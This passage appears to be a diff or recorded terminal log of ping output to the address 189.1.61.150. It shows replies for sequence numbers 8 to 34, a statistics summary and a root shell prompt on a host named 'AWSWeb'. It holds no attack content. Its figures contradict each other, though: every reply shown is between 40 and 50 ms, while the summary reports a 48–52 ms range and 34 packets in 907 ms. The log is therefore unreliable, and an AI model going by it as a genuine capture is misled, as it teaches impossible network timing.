+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=8 ttl=50 time=46.1 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=9 ttl=50 time=45.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=10 ttl=50 time=40.2 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=11 ttl=50 time=41.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=12 ttl=50 time=44.6 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=13 ttl=50 time=43.1 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=14 ttl=50 time=48.5 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=15 ttl=50 time=40.7 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=16 ttl=50 time=42.8 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=17 ttl=50 time=41.7 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=18 ttl=50 time=40.6 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=19 ttl=50 time=46.8 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=20 ttl=50 time=40.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=21 ttl=50 time=49.1 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=22 ttl=50 time=48.4 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=23 ttl=50 time=49.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=24 ttl=50 time=47.6 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=25 ttl=50 time=41.4 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=26 ttl=50 time=49.6 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=27 ttl=50 time=43.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=28 ttl=50 time=46.7 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=29 ttl=50 time=42.4 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=30 ttl=50 time=44.1 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=31 ttl=50 time=40.8 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=32 ttl=50 time=45.9 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=33 ttl=50 time=43.3 ms
+64 bytes from 189.1.61.150 (189.1.61.150): icmp_seq=34 ttl=50 time=45.2 ms
+--- 189.1.61.150 ping statistics ---
+34 packets transmitted, 34 received, 0% packet loss, time 907ms
+rtt min/avg/max/mdev = 48.264/50.352/52.441/2.100 ms
+[4hAWSWeb:~# [K
